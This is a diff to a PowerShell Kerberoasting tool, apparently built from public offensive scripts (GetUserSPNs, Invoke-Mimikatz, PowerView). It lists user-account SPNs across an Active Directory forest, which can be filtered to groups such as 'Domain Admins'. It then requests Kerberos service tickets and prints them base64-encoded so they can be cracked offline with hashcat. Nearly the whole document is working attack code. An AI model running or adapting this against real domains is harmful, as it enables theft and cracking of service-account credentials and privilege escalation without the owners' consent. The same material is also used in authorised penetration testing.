@@ -1,14 +1,13 @@
 # Note: This is a copy of https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1 and https://github.com/PowerShellEmpire/Empire/blob/master/data/module_source/credentials/Invoke-Mimikatz.ps1
-#       Changes have been made to automate the process of requesting service tickets of interest in windows environemnts.  Only minimal testing has been performed
-
+#       Changes have been made to automate the process of requesting service tickets of interest in windows environemnts.
 
 # Instructions:
 # To list ALL user-based SPNs, run:
-#   GetUserSPNs
+#   List-UserSPNs
 # To list user SPNs that involve users in a particular group, run:
-#   GetUserSPNs -Group "Domain Admins"
+#   List-UserSPNs -Group "Domain Admins"
 # To list user SPNs that from a particular domain, run:
-#   GetUserSPNs -Domain "dev.testlab.local"
+#   List-UserSPNs -Domain "dev.testlab.local"
 # When ready to obtain tickets for users in a group/domain of interest, run:
 #   Invoke-AutoKerberoast -Group "Domain Admins" -Domain "dev.testlab.local"
 # If you don't specify a Group/Domain, then it will return tickets for ALL UNQIUE users assoicated with a SPN.  For example, if two MSSQL SPNs are registered to the same user, it will only request a ticket for the first service
@@ -32,8 +31,31 @@
 # History:  2014/11/12     Tim Medin    Created
 #           2016/04/12     Tim Medin    Added -Request option to automatically get the tickets
 
-function GetUserSPNS
+function List-UserSPNs
 {
+<#
+  .SYNOPSIS
+    This function will List all SPNs that use User accounts.  The -Domain and -Group parameters can be used to limit your results.
+
+  .PARAMETER Domain
+    This will only query the DC in a specified domain for SPNs that use User accounts.  Default is to query entire Forest.
+
+  .PARAMETER Group
+    This paremeter will only return SPNs that use users in a specific group, e.g. "Domain Admins"
+
+  .PARAMETER ViewAll
+    Switch that displays ALL SPNs, even if they are protected by the same user.  
+    Default is to only show 1 SPN per user account (e.g. if two MSSQL SPNs are registered to the user sqlAdmin, it will only request a ticket for the first service)
+
+  .PARAMETER Request
+    Switch to also request TGS tickets.  Default is only list available user SPNs.
+
+  .EXAMPLE
+    PS C:\> List-UserSPNS
+    PS C:\> List-UserSPNS -Group "Domain Admins"
+    PS C:\> List-UserSPNS -Domain dev.testlab.local
+#>
+
   [CmdletBinding()]
   Param(
   	[Parameter(Mandatory=$False,Position=1)] 
@@ -59,10 +81,13 @@ function GetUserSPNS
   }
   else # find them
   { 
-  	$ForestInfo = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
-  	$CurrentGCs = $ForestInfo.FindAllGlobalCatalogs()
-
-    $ForestInfo.ApplicationPartitions | % { $GCs += $_.SecurityReferenceDomain }
+    # This code for identifying domains in current forest was Copied directly from Powerview's Get-ForestDomain Function, found at https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
+    $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
+    $ForestSid = (New-Object System.Security.Principal.NTAccount($ForestObject.RootDomain,"krbtgt")).Translate([System.Security.Principal.SecurityIdentifier]).Value
+    $Parts = $ForestSid -Split "-"
+    $ForestSid = $Parts[0..$($Parts.length-2)] -join "-"
+    $ForestObject | Add-Member NoteProperty 'RootDomainSid' $ForestSid
+    $ForestObject.Domains | % { $GCs += $_.Name }   
   }
 
   # Remove any duplicate Global Catalogs Entries from Array
@@ -71,7 +96,7 @@ function GetUserSPNS
   if ( -not $GCs ) 
   {
   	# no Global Catalogs Found
-  	Write-Host "No Global Catalogs Found!"
+  	Write-Output "No Global Catalogs Found!"
   	Exit
   }
 
@@ -165,7 +190,15 @@ function GetUserSPNS
           
           if ( $Request )
           {
-            New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn.ToString() | out-null
+            try
+            {
+                New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn.ToString() | out-null
+            }
+            catch
+            {
+                # Error occured while requesting TGS ticket.
+            }
+            
           }
         }
   	  }
@@ -175,28 +208,68 @@ function GetUserSPNS
 
 function Invoke-AutoKerberoast 
 {
+<#
+    .SYNOPSIS
+        This function automatically request and display TGS tickets protected by user accounts.  The -Domain and -Group parameters can be used to execute targed queries.
+        Once tickets are obtained, use autoKirbi2hashcat.py script to convert base64 encoded tickets to hashcat-compatible file.
+
+    .PARAMETER Domain
+        This will only query the DC in a specified domain for SPNs that use User accounts.  Default is to query entire Forest.
+
+    .PARAMETER Group
+        This paremeter will only return SPNs that use users in a specific group, e.g. "Domain Admins".
+
+    .PARAMETER SPN
+        This paremeter will only request and process TGS ticket for single SPN.  Recommend running List-UserSPNs first to identify name of useful SPN.
+
+    .EXAMPLE
+        PS C:\> List-UserSPNS
+        PS C:\> List-UserSPNS -Group "Domain Admins"
+        PS C:\> List-UserSPNS -Domain dev.testlab.local
+        PS C:\> List-UserSPNS -SPN MSSQLSvc/sqlBox.testlab.local:1433
+#>
+
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory=$False)] 
         [string]$Group="",
 
         [Parameter(Mandatory=$False)]
-        [string]$Domain=""
+        [string]$Domain="",
+
+        [Parameter(Mandatory=$False)]
+        [string]$SPN
     )
-
-    $SPNs = GetUserSPNS -Request -Group $Group -Domain $Domain | Select SPN, DistinguishedName
-
-    if ( ! $SPNs )
-    {
-        write-output "Unable to obtain any user account SPNs"
-        exit
-    }
 
     $SPNsArray = New-Object System.Collections.ArrayList
     $DnameArray = New-Object System.Collections.ArrayList
 
-    $SPNs | % { [void]$SPNsArray.Add($_.SPN) }
-    $SPNs | % { [void]$DnameArray.Add($_.DistinguishedName) }
+    if ( $SPN ) 
+    {
+        try
+        {
+            Add-Type -AssemblyName System.IdentityModel
+            New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPN | out-null
+            [void]$SPNsArray.Add($SPN)
+        }
+        catch
+        {
+            Write-Output "Unable to obtain TGS ticket for SPNs $SPN.   Please check that this is a valid SPN and you are in a domain user context"
+            exit
+        }
+    }
+    else
+    {
+        $SPNs = List-UserSPNs -Request -Group $Group -Domain $Domain | Select SPN, DistinguishedName
+        if ( ! $SPNs )
+        {
+            write-output "Unable to obtain any user account SPNs"
+            exit
+        }
+      
+        $SPNs | % { [void]$SPNsArray.Add($_.SPN) }
+        $SPNs | % { [void]$DnameArray.Add($_.DistinguishedName) }
+    }
 
     while ( $SPNsArray.contains("kadmin/changepw") )
     {
@@ -229,22 +302,30 @@ function Invoke-AutoKerberoast
     $i = 0
     ForEach ( $currentSPN in $SPNsArray )
     {
-        $ticketStartIndex = $kerbTickets.IndexOf($currentSPN)
-        $ticket = $kerbTickets.SubString($ticketStartIndex)
+        try
+        {
+            $ticketStartIndex = $kerbTickets.IndexOf($currentSPN)
+            $ticket = $kerbTickets.SubString($ticketStartIndex)
 
-        $ticketStartIndex = $ticket.IndexOf("====================")
-        $ticket = $ticket.SubString($ticketStartIndex+20)   # Remove everything before first break
+            $ticketStartIndex = $ticket.IndexOf("====================")
+            $ticket = $ticket.SubString($ticketStartIndex+20)   # Remove everything before first break
 
-        $ticketStartIndex = $ticket.IndexOf("====================")
-        $ticket = $ticket.SubString($ticketStartIndex+20)   # Remove everything before second break
+            $ticketStartIndex = $ticket.IndexOf("====================")
+            $ticket = $ticket.SubString($ticketStartIndex+20)   # Remove everything before second break
 
-        $ticketEndIndex = $ticket.IndexOf("====================")   
-        $ticket = $ticket.SubString(0, $ticketEndIndex)   # Grab everything up until the final break
+            $ticketEndIndex = $ticket.IndexOf("====================")   
+            $ticket = $ticket.SubString(0, $ticketEndIndex)   # Grab everything up until the final break
 
-        $currentUser = $DnameArray[$i]
-        Write-Output "`nBase64 encoded Kerberos ticket for `nDISTINGUISHED NAME: $currentUser `nSPN: $currentSPN` :::"
-        Write-Output $ticket
-
+            $currentUser = $DnameArray[$i]
+            Write-Output "`nBase64 encoded Kerberos ticket for `nDISTINGUISHED NAME: $currentUser `nSPN: $currentSPN` :::"
+            Write-Output $ticket
+        }
+        catch
+        {
+            Write-Output "`nBase64 encoded Kerberos ticket for `nDISTINGUISHED NAME: $currentUser `nSPN: $currentSPN` :::"
+            Write-Output "WARNING: Unable to obtain ticket"
+        }
+        
         $i += 1
     }  
 }
